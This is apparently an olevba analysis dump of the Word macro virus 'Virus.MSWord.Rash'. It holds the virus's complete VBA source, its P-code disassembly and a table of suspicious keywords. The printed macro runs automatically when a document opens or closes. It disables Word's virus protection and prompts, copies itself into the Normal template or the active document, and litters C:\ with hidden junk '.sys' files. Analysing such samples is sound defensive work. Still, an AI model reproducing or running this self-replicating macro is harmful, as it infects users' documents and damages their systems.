olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rash
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rash - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Nabor = "RASHKILLER"
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Rem + Âèðóñíàÿ ëàáîðàòîðèÿ Äàíèëà Èãîðåâà  ã.Ïèò-Ñàíòåðáóðã   1999+
Rem +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
On Error Resume Next

con = "Private Sub Document_Close()"
col = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Dim mas(90)

Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
no1 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)
no2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1)

If no1 <> con Then
Set tst = NormalTemplate.VBProject.VBComponents.Item(1)
ElseIf no2 <> con Then
Set tst = ActiveDocument.VBProject.VBComponents.Item(1)
Else
tst = ""
End If

If tst <> "" Then
  For i = 1 To col
   mas(i) = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
  Next i
  
  For i = 1 To col
   tst.CodeModule.InsertLines i, mas(i)
  Next i
  
End If

For i = 1 To 20

 nam = "c:\AA"
 
 
  For j = 1 To 6
   kk = 10 * Rnd
   nam = nam + Mid(Nabor, Int(kk), 1)
  Next j
  
 nam = nam + ".sys"
 Open nam For Output As #1
 Seek #1, 65535 * 2
 Print #1,  'Ïðèÿòíîé ðàáîòû'
 Close #1
 
 SetAttr nam, 6
 
Next i

End Sub

Private Sub Document_Open()
 Document_Close
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Rash
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8214 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	LitStr 0x000A "RASHKILLER"
' 	St Nabor 
' Line #2:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #3:
' 	Rem 0x0040 " + Âèðóñíàÿ ëàáîðàòîðèÿ Äàíèëà Èãîðåâà  ã.Ïèò-Ñàíòåðáóðã   1999+"
' Line #4:
' 	Rem 0x0040 " +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
' Line #5:
' 	OnError (Resume Next) 
' Line #6:
' Line #7:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	St con 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St col 
' Line #9:
' Line #10:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x005A 
' 	VarDefn mas
' Line #11:
' Line #12:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #14:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #15:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St no1 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St no2 
' Line #17:
' Line #18:
' 	Ld no1 
' 	Ld con 
' 	Ne 
' 	IfBlock 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set tst 
' Line #20:
' 	Ld no2 
' 	Ld con 
' 	Ne 
' 	ElseIfBlock 
' Line #21:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set tst 
' Line #22:
' 	ElseBlock 
' Line #23:
' 	LitStr 0x0000 ""
' 	St tst 
' Line #24:
' 	EndIfBlock 
' Line #25:
' Line #26:
' 	Ld tst 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld col 
' 	For 
' Line #28:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld i 
' 	ArgsSt mas 0x0001 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' Line #31:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld col 
' 	For 
' Line #32:
' 	Ld i 
' 	Ld i 
' 	ArgsLd mas 0x0001 
' 	Ld tst 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #33:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #34:
' Line #35:
' 	EndIfBlock 
' Line #36:
' Line #37:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0014 
' 	For 
' Line #38:
' Line #39:
' 	LitStr 0x0005 "c:\AA"
' 	St nam 
' Line #40:
' Line #41:
' Line #42:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0006 
' 	For 
' Line #43:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	St kk 
' Line #44:
' 	Ld nam 
' 	Ld Nabor 
' 	Ld kk 
' 	FnInt 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St nam 
' Line #45:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' Line #47:
' 	Ld nam 
' 	LitStr 0x0004 ".sys"
' 	Add 
' 	St nam 
' Line #48:
' 	Ld nam 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDI4 0xFFFF 0x0000 
' 	LitDI2 0x0002 
' 	Mul 
' 	Seek 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	PrintNL 
' 	QuoteRem 0x000C 0x0010 "Ïðèÿòíîé ðàáîòû'"
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #52:
' Line #53:
' 	Ld nam 
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #54:
' Line #55:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' Line #57:
' 	EndSub 
' Line #58:
' Line #59:
' 	FuncDefn (Private Sub Document_Open())
' Line #60:
' 	ArgsCall Document_Close 0x0000 
' Line #61:
' 	EndSub 
' Line #62:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

